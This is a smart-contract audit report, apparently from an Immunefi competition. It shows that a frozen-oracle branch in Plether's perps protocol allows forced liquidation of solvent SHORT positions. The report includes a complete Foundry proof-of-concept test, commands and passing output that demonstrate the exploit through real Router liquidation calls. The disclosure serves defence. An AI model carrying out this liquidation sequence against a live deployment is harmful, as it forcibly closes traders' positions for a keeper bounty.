# \#99604 [SC-Medium] Incomplete MED-10 fix permits forced liquidation of solvent SHORT positions during oracle-frozen windows

**Submitted on Nov 14th 2026 at 13:05:46 UTC by @manvi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99604
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief / Introduction

I found that the correction for Cecuro MED-10 is incomplete. That finding addressed a SHORT liquidation price calculated by capping the basket first and subtracting the adverse confidence adjustment afterwards. The deployed correction applies the adjustment to the raw, uncapped basket and caps only the final directional price. The fix works for live liquidation pricing, but the oracle-frozen branch still supplies an already-capped Engine mark to that calculation.

During an oracle-frozen window, `PletherOracle._frozenBasket()` obtains `engine.lastMarkPrice()`. The Engine stores that mark after clamping it to `CAP_PRICE`. When the liquidation path applies the SHORT confidence shift to the stored mark, the result becomes `CAP_PRICE - shift` even if the last accepted raw basket was sufficiently above the cap that the corrected MED-10 calculation would produce `CAP_PRICE`.

I reproduced the consequence through the actual Router liquidation entrypoints. A SHORT position remains solvent when I execute a liquidation attempt in the final live Friday FAD period. I leave the accepted test basket unchanged, advance into the oracle-frozen window and liquidate the same position at the lower frozen price. Both the single-account and batch liquidation paths close the position, and the keeper receives **149.45 USDG**.

This is an executable premature liquidation, not just a discrepancy between two price views. My PoC uses the existing Foundry protocol fixture, simulated signed Pyth price data, ordinary keeper calls and the unmodified production contracts.

## Vulnerability Details

### 1. MED-10 corrected the order of confidence adjustment and capping

The MED-10 fix specifies the following order for directional liquidation pricing:

```text
Correct SHORT liquidation price = min(rawBasketPrice - confidenceShift, CAP_PRICE)
```

The liquidation entrypoints implement that final cap in `PletherOracle.sol`. For batch liquidation, the relevant operation is:

```solidity
shortPrice: _clampToCap(
    _directionalLiquidationPriceFromShift(CfdTypes.Side.SHORT, rawPrice, shift)
),
```

For single-account liquidation, the code likewise calculates:

```solidity
(snapshot, rawPrice, confidence) = _updateLiquidationSnapshot(pythUpdateData);
snapshot.price = _clampToCap(_adverseLiquidationPrice(account, rawPrice, confidence));
```

`_updateLiquidationSnapshot()` deliberately returns `basket.price` as `rawPrice`, so the adjustment is applied before `_clampToCap()` when `basket.price` actually comes from the uncapped live oracle basket.

### 2. The frozen branch changes the meaning of `rawPrice`

The Engine caps the neutral mark before storing it:

```solidity
uint256 clamped = price > CAP_PRICE ? CAP_PRICE : price;
_applyCarryAndMark(clamped, publishTime);
```

In `PletherOracle._frozenBasket()`, the value subsequently used as the liquidation price input is that *stored capped mark*:

```solidity
basket.price = engine.lastMarkPrice();
basket.publishTime = engine.lastMarkTime();
// Liquidations receive a deterministic, conservative confidence shift while Pyth is closed.
basket.confidence = basket.price * basketMaxConfidenceRatioBps / 10_000;
```

During an oracle freeze, `_resolveCurrentBasket()` returns this frozen basket. `_updateLiquidationSnapshot()` then assigns `rawPrice = basket.price`, but the value is no longer the uncapped basket to which MED-10's fix was intended to apply. The directional shift is consequently taken **after the original cap has already discarded the above-cap portion**.

Both `updateLiquidationPrice()` and `updateLiquidationBatchPrice()` take this path. Applying `_clampToCap()` once more at the end does not repair the lost raw-price information.

### 3. The difference appears without another market-price movement

I used the release-style confidence settings and the following values:

| Parameter | Value |
|---|---:|
| Raw signed test basket before freeze | `240_000_000` (2.40) |
| Engine's stored neutral mark | `200_000_000` (2.00) |
| `CAP_PRICE` | `200_000_000` (2.00) |
| `basketMaxConfidenceRatioBps` | `10` |
| `adverseConfidenceMultiplierBps` | `2_500` |
| Frozen synthetic confidence | `200_000` |
| Frozen adverse shift | `50_000` |

The corrected live MED-10 calculation gives:

```text
min(raw basket - adverse shift, CAP)
= min(240,000,000 - shift, 200,000,000)
= 200,000,000
```

The frozen path calculates:

```text
Stored capped mark                  200,000,000
Synthetic confidence               200,000
Confidence shift (25%)              50,000
Frozen SHORT liquidation price     199,950,000
```

The result differs by **50,000 oracle-price units**, or **0.0005** in the eight-decimal price representation. I do not need a new signed market update during the freeze to obtain this lower liquidation price.

### 4. A solvent position becomes eligible for permissionless liquidation

I opened a `150_000e18` SHORT for Alice at an initial oracle price of `1.99`, with **8,367.522006 USDG** margin. The PoC finds the margin boundary using a binary search over actual Engine liquidation eligibility and sets the position just inside the solvent region at the capped reference price.

In the final live Friday FAD period, the Engine has the capped `2.00` mark, and the `3%` FAD margin requirement already applies. A keeper attempts `router.executeLiquidation()` with the above-cap basket. The call reverts with `CfdEngine__PositionIsSolvent`.

After advancing to the real frozen calendar interval, the PoC asserts both outcomes on the same position:

```solidity
assertFalse(_liqAt(CAP_PRICE), "solvent at the cap-adjusted price min(raw - shift, CAP) = CAP");
assertTrue(_liqAt(frozenShortLiqPrice), "insolvent only at the capped-then-shifted price");
```

The keeper can then execute either `router.executeLiquidation()` or `router.executeLiquidationBatch()` with **empty Pyth update data**. Both succeed, delete Alice's open position and credit the keeper's bounty. The test does not bypass the Router, impersonate the Oracle's authorized caller or write directly into Engine storage.

## Attack Sequence

1. **A valid SHORT is opened before the freeze.** Alice opens a `150_000e18` SHORT at `1.99` and supplies margin that is solvent at the correctly capped liquidation reference.
2. **The last live basket is accepted above CAP.** At Friday 21:31 UTC, a keeper submits a simulated signed raw basket at `2.40`; `router.updateMarkPrice()` installs the neutral Engine mark at its configured `2.00` cap. The FAD requirement is already active.
3. **The live control rejects liquidation.** At the same oracle basket, `router.executeLiquidation()` reverts with `CfdEngine__PositionIsSolvent`.
4. **The market enters the frozen interval.** At Saturday 12:00 UTC, the Oracle reads the capped Engine mark and derives its frozen synthetic confidence. The SHORT liquidation price becomes `1.9995` despite no further market-price update.
5. **An untrusted keeper closes the position.** The keeper calls single-account or batch liquidation. The SHORT is forcibly closed, and the keeper receives `149_450_000` USDG atoms (**149.45 USDG**).

## Impact Details

The selected Immunefi impact is **Griefing**. The demonstrated damage is a forced close of an otherwise-solvent trader position because of a liquidation price that changes at the frozen-policy boundary, not because the trader's position crossed the corrected live liquidation threshold.

My PoC records the following outcomes in **both** production liquidation paths:

| Observation | Result |
|---|---:|
| Alice's initial position size | `150_000e18` SHORT |
| Margin posted | 8,367.522006 USDG |
| Corrected live SHORT price | 2.0000 |
| Live liquidation attempt | Reverts: `CfdEngine__PositionIsSolvent` |
| Frozen SHORT price | 1.9995 |
| Frozen liquidation eligibility | Liquidatable |
| Position size after liquidation | Zero |
| Keeper bounty | **149.45 USDG** |
| Single-account PoC | PASS |
| Batch PoC | PASS |

The trader loses the open position and incurs liquidation settlement when the corresponding live calculation would leave that position intact. The keeper can initiate this result without a privileged role or access to Alice's margin account.

The printed Alice balances before and after liquidation are not interchangeable measures of net trader loss: the before value excludes the open position and the after value reflects its settlement. I therefore use the **completed forced close and the actual 149.45 USDG keeper bounty**, rather than inventing an additional principal-loss figure, as the directly observed impact.

## Suggested Remediation

The frozen liquidation path should preserve the same **directional shift before cap** invariant that the MED-10 fix established for live liquidation, while keeping the Engine's neutral mark capped for its existing accounting purposes.

One approach is to retain an authenticated **uncapped reference basket** together with the last capped Engine mark when a valid live basket is installed. Frozen liquidation could then derive the directional price from the retained raw reference and clamp only the final result. This must preserve the current frozen-window freshness, publish-time and maximum-staleness requirements, and it should apply identically to the single-account and batch APIs.

Regression tests should cover a raw basket exactly at CAP and several above-CAP baskets, compare the final live liquidation with the subsequent frozen calculation, and assert that an account solvent at the corrected cap-adjusted reference cannot be liquidated solely because the calendar moved into the frozen window.

## References

- [Cecuro MED-10 correction commit](https://github.com/Plether-Fi/plether-core/commit/006c818d364282943e2063eab52ab0c89181304c) — fixed the live directional confidence/cap ordering.
- [`PletherOracle.updateLiquidationBatchPrice()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L299-L320) — batch directional prices, including the SHORT price.
- [`PletherOracle.updateLiquidationPrice()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L325-L345) — single-account adverse liquidation price.
- [`PletherOracle._updateLiquidationSnapshot()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L532-L543) — supplies `rawPrice` and confidence to both liquidation APIs.
- [`PletherOracle._frozenBasket()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L744) — uses the already-capped Engine mark during the freeze.
- [`PletherOracle._resolveCurrentBasket()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L749-L763) — selects the frozen basket when the Oracle is frozen.
- [`CfdEngine.updateMarkPrice()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1464-L1478) — caps the Engine's stored neutral mark.
- [`ORACLE_SYNCHRONIZATION.md`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ORACLE_SYNCHRONIZATION.md) — documents the live and frozen oracle data paths.


## Proof of Concept

## Proof of Concept


I reproduced this against the exact audited commit using the repository's existing `BasePerpTest` fixture, with simulated signed Pyth data and the real Router, Engine and liquidation implementations. I changed no production contract under `packages/perps/src`.

**Repository:** `https://github.com/immunefi-team/audit-comp-plether`  
**Commit:** `a82d4fefb02768e5b3bddcc97dee371eee24fea8`  
**PoC path:** `packages/perps/test/perps/insight/Chase_medfixes2_FrozenShortLiqBelowCap.t.sol`  
**PoC SHA-256:** `471a6693d4c54312b3e97e8124a528caac69d859b7e7524acec3443884599724`

## Reproduction Steps

1. Check out the audited commit and place the complete Solidity test below at `packages/perps/test/perps/insight/Chase_medfixes2_FrozenShortLiqBelowCap.t.sol`.
2. Run both tests together using the command below. The fixture seeds a live `1.99` mark, creates Alice's SHORT and calculates the margin level that separates solvent and liquidatable states at the cap.
3. The PoC installs a simulated signed live basket of `2.40` through the ordinary Router update path and confirms the stored Engine mark is `2.00`.
4. It runs a live liquidation as a control and expects `CfdEngine__PositionIsSolvent`.
5. It advances into the frozen interval with no new price update, checks liquidation eligibility at `2.00` and `1.9995`, then performs single-account and batch liquidation in independent tests.
6. Compare the test logs with the observed output below. The keeper bounty should equal `149450000` USDG atoms and both tests should pass.

## Complete Solidity PoC Source

**Save as:** `packages/perps/test/perps/insight/Chase_medfixes2_FrozenShortLiqBelowCap.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice MED-10 incomplete fix (frozen-window sibling).
///         MED-10 fix (eadc5c58): "Single-account and batch liquidation pricing now apply the directional confidence
///         adjustment to the raw, uncapped basket, then clamp the resulting liquidation price to CAP ... This removes
///         the artificial below-cap SHORT liquidation price caused by subtracting confidence from an already capped mark."
///         The fix only feeds the raw basket on the LIVE path. During an oracle-frozen window `_resolveCurrentBasket`
///         returns `_frozenBasket`, whose `price` is the Engine's CAPPED `lastMarkPrice`, and `updateLiquidationPrice`
///         then subtracts the confidence shift from that capped mark: SHORT liquidation price = CAP - shift
///         (199_950_000 with release params, the exact number from the MED-10 report) even though the Oracle's accepted
///         raw basket (stored uncapped in `_acceptedBasket`) is far above CAP, where the intended price is
///         min(raw - shift, CAP) = CAP. A SHORT that is solvent at the cap-adjusted price is liquidated (and pays
///         size * shift extra) by any untrusted keeper as soon as the market freezes, with no market move.
contract Chase_medfixes2_FrozenShortLiqBelowCap is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant KEEPER = address(0xCAFE);

    uint256 internal constant SIZE = 150_000e18;
    uint256 internal constant RAW_ABOVE_CAP = 240_000_000; // raw basket 2.40 > CAP 2.00
    uint256 internal constant FRIDAY_2100 = 1_709_931_600; // live, pre-FAD
    uint256 internal constant FRIDAY_2131 = 1_709_933_460; // FAD lead, live
    uint256 internal constant SATURDAY_NOON = 1_709_985_600; // oracle frozen

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        // Release oracle: adverseConfidenceMultiplierBps = 2_500, basketMaxConfidenceRatioBps = 10 (default).
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500);
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10);
    }

    function _to(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// @dev Live signed basket at the current timestamp, both feeds at `price` with confidence `conf`.
    function _liveUpdate(
        uint256 price,
        uint64 conf
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ups = new MockPyth.FeedUpdate[](ids.length);
        uint256 t = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            ups[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(price)), conf: conf, expo: -8, publishTime: t, prevPublishTime: t - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(ups);
    }

    function _seedMark() internal {
        bytes[] memory u = _liveUpdate(199_000_000, 0);
        vm.prank(KEEPER);
        router.updateMarkPrice(u);
        _to(vm.getBlockTimestamp() + 2);
    }

    function _openShort(
        uint256 margin
    ) internal {
        _fundTrader(ALICE, margin + 5000e6);
        vm.prank(ALICE);
        uint64 id = router.commitOrder(CfdTypes.Side.SHORT, SIZE, margin, 0, false);
        bytes[] memory u = _mockPythUpdateData(199_000_000);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, u);
        (uint256 s,,,,,,) = engine.positions(ALICE);
        if (s != SIZE) {
            console2.log("status", uint256(r.status));
            console2.log("pending", uint256(r.pendingReason));
            console2.log("reason", uint256(r.terminalReason));
            revert("open failed");
        }
    }

    /// @dev Live FAD-lead mark refresh with the raw basket above CAP and a 10 bps (max allowed) confidence.
    function _pushRawAboveCap() internal {
        _to(FRIDAY_2131);
        bytes[] memory u = _liveUpdate(RAW_ABOVE_CAP, uint64(RAW_ABOVE_CAP / 1000));
        vm.prank(KEEPER);
        router.updateMarkPrice(u);
    }

    function _liqAt(
        uint256 price
    ) internal view returns (bool) {
        return engineLens.isLiquidatableAt(ALICE, price, pool.totalAssets());
    }

    /// @dev Builds the scenario with margin `m` and returns whether the SHORT is liquidatable at CAP once frozen.
    function _probe(
        uint256 m
    ) internal returns (bool liqAtCap) {
        uint256 snap = vm.snapshotState();
        _openShort(m);
        _pushRawAboveCap();
        _to(SATURDAY_NOON);
        liqAtCap = _liqAt(CAP_PRICE);
        vm.revertToState(snap);
    }

    function test_FrozenShortLiquidatedBelowCapAdjustedPrice() public {
        _run(false);
    }

    function test_FrozenShortLiquidatedBelowCapAdjustedPrice_Batch() public {
        _run(true);
    }

    function _run(
        bool batch
    ) internal {
        _to(FRIDAY_2100);
        _seedMark();
        // Find the smallest margin at which the SHORT is NOT liquidatable at the cap-adjusted price once frozen.
        uint256 lo = 3000e6;
        uint256 hi = 20_000e6;
        assertTrue(_probe(lo), "lo must be liquidatable");
        assertFalse(_probe(hi), "hi must be solvent");
        while (hi - lo > 1) {
            uint256 mid = (lo + hi) / 2;
            if (_probe(mid)) {
                lo = mid;
            } else {
                hi = mid;
            }
        }
        uint256 margin = hi + 5e6; // 5 USDG inside the solvent region at CAP
        console2.log("position margin (USDG atoms):", margin);

        _openShort(margin);

        // ---- Control: LIVE (FAD lead, 3% margin) liquidation with the same raw basket and confidence ----
        _pushRawAboveCap();
        (bool accepted, uint256 acceptedCapped,) = pletherOracle.getAcceptedBasketMark();
        assertTrue(accepted);
        assertEq(acceptedCapped, CAP_PRICE, "accepted raw basket is above CAP");
        assertEq(engine.lastMarkPrice(), CAP_PRICE);
        assertTrue(engine.isFadWindow(), "FAD lead: 3% margin already applies");
        assertFalse(engine.isOracleFrozen());
        {
            _to(FRIDAY_2131 + 5);
            bytes[] memory u = _liveUpdate(RAW_ABOVE_CAP, uint64(RAW_ABOVE_CAP / 1000));
            vm.prank(KEEPER);
            vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
            router.executeLiquidation(ALICE, u); // live price = min(raw - shift, CAP) = CAP -> solvent
        }

        // ---- Frozen window: same raw basket, no market move ----
        _to(SATURDAY_NOON);
        assertTrue(engine.isOracleFrozen());
        uint256 frozenShift = (CAP_PRICE * pletherOracle.basketMaxConfidenceRatioBps() / 10_000)
            * pletherOracle.adverseConfidenceMultiplierBps() / 10_000;
        uint256 frozenShortLiqPrice = CAP_PRICE - frozenShift;
        console2.log("frozen SHORT liquidation price:", frozenShortLiqPrice);
        assertEq(frozenShortLiqPrice, 199_950_000, "the MED-10 report's below-cap number");
        assertFalse(_liqAt(CAP_PRICE), "solvent at the cap-adjusted price min(raw - shift, CAP) = CAP");
        assertTrue(_liqAt(frozenShortLiqPrice), "insolvent only at the capped-then-shifted price");

        uint256 aliceBefore = clearinghouse.balanceAssets(ALICE) + engine.traderClaimBalanceAssets(ALICE);
        bytes[] memory none = new bytes[](0);
        vm.prank(KEEPER);
        if (batch) {
            address[] memory accts = new address[](1);
            accts[0] = ALICE;
            router.executeLiquidationBatch(accts, none);
        } else {
            router.executeLiquidation(ALICE, none);
        }
        (uint256 s,,,,,,) = engine.positions(ALICE);
        assertEq(s, 0, "SHORT liquidated during the frozen window at CAP - shift");
        uint256 aliceAfter = clearinghouse.balanceAssets(ALICE) + engine.traderClaimBalanceAssets(ALICE);
        console2.log("alice value before liquidation (excl. position):", aliceBefore);
        console2.log("alice value after liquidation:", aliceAfter);
        console2.log("keeper bounty:", clearinghouse.balanceAssets(KEEPER));
    }

}
```

## Commands

Run from the audit repository root:

```bash
# Run these commands from the audited repository root
export PATH="$HOME/.foundry/bin:$PATH"

git rev-parse HEAD
# Expected: a82d4fefb02768e5b3bddcc97dee371eee24fea8

sha256sum packages/perps/test/perps/insight/Chase_medfixes2_FrozenShortLiqBelowCap.t.sol
# Expected: 471a6693d4c54312b3e97e8124a528caac69d859b7e7524acec3443884599724

forge test \
  --root packages/perps \
  --match-path 'test/perps/insight/Chase_medfixes2_FrozenShortLiqBelowCap.t.sol' \
  -vv

git diff -- packages/perps/src
# Expected: no source modifications
```

For detailed single-account and batch execution traces:

```bash
forge test --root packages/perps \
  --match-path 'test/perps/insight/Chase_medfixes2_FrozenShortLiqBelowCap.t.sol' \
  --match-test '^test_FrozenShortLiquidatedBelowCapAdjustedPrice$' \
  -vvvv

forge test --root packages/perps \
  --match-path 'test/perps/insight/Chase_medfixes2_FrozenShortLiqBelowCap.t.sol' \
  --match-test '^test_FrozenShortLiquidatedBelowCapAdjustedPrice_Batch$' \
  -vvvv
```

## Observed Console Output

This is the actual output from my completed two-test run on the audited commit:

```text
Ran 2 tests for test/perps/insight/Chase_medfixes2_FrozenShortLiqBelowCap.t.sol:Chase_medfixes2_FrozenShortLiqBelowCap
[PASS] test_FrozenShortLiquidatedBelowCapAdjustedPrice() (gas: 103542022)
Logs:
  position margin (USDG atoms): 8367522006
  frozen SHORT liquidation price: 199950000
  alice value before liquidation (excl. position): 12803300001
  alice value after liquidation: 13929800001
  keeper bounty: 149450000

[PASS] test_FrozenShortLiquidatedBelowCapAdjustedPrice_Batch() (gas: 103545746)
Logs:
  position margin (USDG atoms): 8367522006
  frozen SHORT liquidation price: 199950000
  alice value before liquidation (excl. position): 12803300001
  alice value after liquidation: 13929800001
  keeper bounty: 149450000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 428.29ms (819.07ms CPU time)

Ran 1 test suite in 429.68ms (428.29ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
========== TEST RESULT ==========
Foundry exit status: 0
```

## What the PoC Proves

The test does not stop at an oracle arithmetic comparison. It creates a real SHORT, establishes a healthy live-liquidation control at the capped price, reaches the frozen calendar path and demonstrates that the same position becomes liquidatable only at the lower capped-then-shifted price. Both Router liquidation entrypoints then close the position and credit the keeper's bounty.

The source includes the margin-boundary search, both liquidation eligibility assertions, the expected live `CfdEngine__PositionIsSolvent` revert and the post-liquidation `assertEq(s, 0)` assertion. The final run passed **2/2 tests**, with **no changes to production contracts**.

